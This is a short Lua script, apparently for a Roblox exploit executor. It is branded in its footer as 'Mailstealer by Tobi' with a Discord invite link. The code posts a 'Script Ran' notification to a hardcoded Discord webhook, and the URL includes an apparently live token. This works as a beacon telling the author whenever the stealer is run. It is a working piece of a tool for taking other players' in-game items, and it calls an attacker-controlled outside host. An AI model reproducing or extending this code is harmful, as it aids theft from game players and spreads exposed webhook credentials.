local function SendMessage(url)
    local HttpService = game:GetService("HttpService")

    local headers = {
        ["Content-Type"] = "application/json"
    }

    local data = {
        ["embeds"] = {{
            ["title"] = "Script Ran",
            ["color"] = 65280,
            ["footer"] = {
                ["text"] = "Mailstealer by Tobi. discord.gg/HcpNe56R2a"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end
local webhook = "https://discord.com/api/webhooks/1244295971421294753/ZR-3tY1ywUZZIqS27YBdbRfpKNs2Tgwkpqw8SFOyZ3YGDVJmBQhqAKhLLD19i0ldGPlr"
SendMessage(webhook)
